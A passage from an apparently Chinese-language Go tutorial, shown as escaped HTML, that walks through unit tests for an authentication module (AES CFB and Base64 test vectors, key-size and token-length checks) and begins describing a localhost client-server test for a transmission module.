&lt;li&gt;认证模块的函数耦合度不高，可以独立测试，为每个函数编写一个测试函数。在 &lt;code&gt;authenticate&lt;/code&gt; 目录下新建 &lt;code&gt;authenticate_test.go&lt;/code&gt;。以 AES CFB 加解密模块为例，下面这三组测试数据是在密钥为 &lt;code&gt;AABCDEFGHIJKLMNOPBCDEFGHIJKLMNOP&lt;/code&gt; 情况下加密生成的，我们需要测试 &lt;code&gt;AesEncoding&lt;/code&gt; 和 &lt;code&gt;AesDecoding&lt;/code&gt; 的正确性。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight golang&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// authenticate_test.go&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; testAESes = []testS&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;An Apple A Day&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;\xca\x35\x19\xc8\x90\x0a\xed\x4f\x69\x09\x3e\xb2\x56\x41&quot;&lt;/span&gt;&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;Keep Doctor Away  .&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;\xc0\x3e\x5c\xf9\xc0\x3e\xee\x49\x3d\x27\x6c\xd6\x76\x4f\xed\x74\xeb\x1a\xe4&quot;&lt;/span&gt;&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;+w-s*a/d%4&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;\xa0\x2c\x14\xfa\xca\x1b\xae\x4e\x6c\x7c&quot;&lt;/span&gt;&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;编写 &lt;code&gt;TestAesDecoding&lt;/code&gt; 函数，注意测试列表中的二元组元素均为 &lt;code&gt;string&lt;/code&gt;，为了符合 &lt;code&gt;verify&lt;/code&gt; 和 &lt;code&gt;AesDecoding&lt;/code&gt; 的参数类型，需要对某些位置使用 &lt;code&gt;[]byte&lt;/code&gt; 或 &lt;code&gt;string&lt;/code&gt; 做类型转换。我们将测试列表中二元组的后者作为 &lt;code&gt;AesDecoding&lt;/code&gt; 的输入，并将其输出和二元组的前者做比对。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight golang&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; TestAesDecoding(t *testing.T) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	c := NewAesBlock([]&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;AABCDEFGHIJKLMNOPBCDEFGHIJKLMNOP&quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i, item := &lt;span class=&quot;keyword&quot;&gt;range&lt;/span&gt; testAESes &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		s, err := AesDecode([]&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(item.out), &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;len&lt;/span&gt;(item.in)), c)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		verify(t, i, &lt;span class=&quot;string&quot;&gt;&quot;AesDecoding 256bits&quot;&lt;/span&gt;, []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(item.out), []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(item.in), s, err)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;同样，将输入、输出参数位置调换即可写出 &lt;code&gt;TestAesEncoding&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight golang&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// authenticate_test.go&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; TestAesEncoding(t *testing.T) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	c := NewAesBlock([]&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;AABCDEFGHIJKLMNOPBCDEFGHIJKLMNOP&quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i, item := &lt;span class=&quot;keyword&quot;&gt;range&lt;/span&gt; testAESes &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		s := AesEncode([]&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(item.in), c)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		verify(t, i, &lt;span class=&quot;string&quot;&gt;&quot;AesEncoding 256bits&quot;&lt;/span&gt;, []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(item.in), []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(item.out), s, &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;authenticate_test.go&lt;/code&gt; 其它部分代码如下：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight golang&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// authenticate_test.go&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;package&lt;/span&gt; authenticate&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;testing&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;type&lt;/span&gt; testS &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	in  &lt;span class=&quot;typename&quot;&gt;string&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	out &lt;span class=&quot;typename&quot;&gt;string&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; testBase64s = []testS&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;An Apple A Day&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;QW4gQXBwbGUgQSBEYXk=&quot;&lt;/span&gt;&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;Keep Doctor Away  .&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;S2VlcCBEb2N0b3IgQXdheSAgLg==&quot;&lt;/span&gt;&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;+w-s*a/d%4&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;K3ctcyphL2QlNA==&quot;&lt;/span&gt;&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; TestBase64Encoding(t *testing.T) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i, item := &lt;span class=&quot;keyword&quot;&gt;range&lt;/span&gt; testBase64s &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		s := Base64Encode([]&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(item.in))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		verify(t, i, &lt;span class=&quot;string&quot;&gt;&quot;Base64Encoding&quot;&lt;/span&gt;, []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(item.in), []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(item.out), s, &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; TestBase64Decoding(t *testing.T) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i, item := &lt;span class=&quot;keyword&quot;&gt;range&lt;/span&gt; testBase64s &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		s, err := Base64Decode([]&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(item.out))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		verify(t, i, &lt;span class=&quot;string&quot;&gt;&quot;Base64Decoding&quot;&lt;/span&gt;, []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(item.out), []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(item.in), s, err)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; TestNewAes(t *testing.T) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	testkey1 := &lt;span class=&quot;string&quot;&gt;&quot;abcdefghijklmnop&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	c := NewAesBlock([]&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(testkey1))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; c == &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		t.Errorf(&lt;span class=&quot;string&quot;&gt;&quot;NewAesBlock returns nil with 128bits key %s&quot;&lt;/span&gt;, testkey1)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	testkey2 := &lt;span class=&quot;string&quot;&gt;&quot;abcdefghijklmnopabcdefgh&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	c = NewAesBlock([]&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(testkey2))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; c == &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		t.Errorf(&lt;span class=&quot;string&quot;&gt;&quot;NewAesBlock returns nil with 192bits key %s&quot;&lt;/span&gt;, testkey2)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	testkey3 := &lt;span class=&quot;string&quot;&gt;&quot;abcdefghijklmnopabcdefghijklmnop&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	c = NewAesBlock([]&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(testkey3))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; c == &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		t.Errorf(&lt;span class=&quot;string&quot;&gt;&quot;NewAesBlock returns nil with 256bits key %s&quot;&lt;/span&gt;, testkey3)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; TestGenerateToken(t *testing.T) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; !(&lt;span class=&quot;built_in&quot;&gt;len&lt;/span&gt;(GenerateToken(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)) == &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt; &amp;amp;&amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;len&lt;/span&gt;(GenerateToken(&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;)) == &lt;span class=&quot;number&quot;&gt;24&lt;/span&gt; &amp;amp;&amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;len&lt;/span&gt;(GenerateToken(&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;)) == &lt;span class=&quot;number&quot;&gt;32&lt;/span&gt; &amp;amp;&amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;len&lt;/span&gt;(GenerateToken(&lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;)) == &lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		t.Errorf(&lt;span class=&quot;string&quot;&gt;&quot;Generate Token Error.&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;在 &lt;code&gt;authenticate&lt;/code&gt; 目录下启动终端，执行 &lt;code&gt;go test&lt;/code&gt;，输出结果为 &lt;code&gt;OK, pass&lt;/code&gt; 表明单元测试通过。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;传输模块单元测试&quot;&gt;&lt;a href=&quot;#传输模块单元测试&quot; class=&quot;headerlink&quot; title=&quot;传输模块单元测试&quot;&gt;&lt;/a&gt;传输模块单元测试&lt;/h1&gt;&lt;p&gt;传输模块无法直接通过相互独立的测试函数验证，因此编写一个用于测试的简单服务器和客户端。在 &lt;code&gt;transmit&lt;/code&gt; 目录下新建 &lt;code&gt;transmit_test.go&lt;/code&gt;。测试流程如下：客户端向服务器发送连接请求，连接成功则接收服务器发送的一个文件，之后再接收一组字节。如无错误则调用 &lt;code&gt;Destroy()&lt;/code&gt; 断开连接。之后测试函数验证客户端接收到的文件和源文件是否相同，接收到的字节流和源字节流是否相同，如二者相左则调用 &lt;code&gt;t.Errorf()&lt;/code&gt; 发出错误报告。&lt;/p&gt;
&lt;h2 id=&quot;客户端函数&quot;&gt;&lt;a href=&quot;#客户端函数&quot; class=&quot;headerlink&quot; title=&quot;客户端函数&quot;&gt;&lt;/a&gt;客户端函数&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;我们要测试的功能包括普通字节传输（&lt;code&gt;RecvBytes/SendBytes&lt;/code&gt;）、文件传输（&lt;code&gt;SendFromReader/RecvToWriter&lt;/code&gt;）以及 &lt;code&gt;Destroy&lt;/code&gt;、&lt;code&gt;NewTransmitter&lt;/code&gt; 等接口中提供的函数，接口中未导出的函数也会在代码中涉及到。&lt;/li&gt;
&lt;li&gt;因为客户端和服务器运行在同一个测试程序中，代码中需要延时一秒以保证服务器启动完成（服务器进入 &lt;code&gt;listen&lt;/code&gt; 状态后阻塞，因此客户端需先启动）。&lt;/li&gt;
&lt;li&gt;客户端测试函数代码如下：&lt;ul&gt;
&lt;li&gt;先启动一个 &lt;code&gt;net.Conn&lt;/code&gt; 连接 &lt;code&gt;127.0.0.1:10086&lt;/code&gt; ，即测试服务器监听的端口；&lt;/li&gt;
&lt;li&gt;连接成功后创建一个以变量 &lt;code&gt;test_out_filename&lt;/code&gt; 命名的文件（该变量是测试代码的全局变量，我们将在编写完测试函数后定义，它指定了测试客户端接收文件时存储的名称）；&lt;/li&gt;
&lt;li&gt;创建成功后建立一个新的 &lt;code&gt;transmitter&lt;/code&gt;，使用变量 &lt;code&gt;pass&lt;/code&gt; 存储的内容作为双方加密的密钥（该变量也是测试代码的全局变量）；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;transmitter&lt;/code&gt; 创建成功后接收一个文件，再接收一个字符串；&lt;/li&gt;
&lt;li&gt;将该字符串和 &lt;code&gt;test_string&lt;/code&gt; 比对，&lt;code&gt;test_string&lt;/code&gt; 同样是可设置的全局变量；&lt;/li&gt;
&lt;li&gt;比对结束，无误退出，否则通过 &lt;code&gt;t.Errorf()&lt;/code&gt; 报告错误。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight golang&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 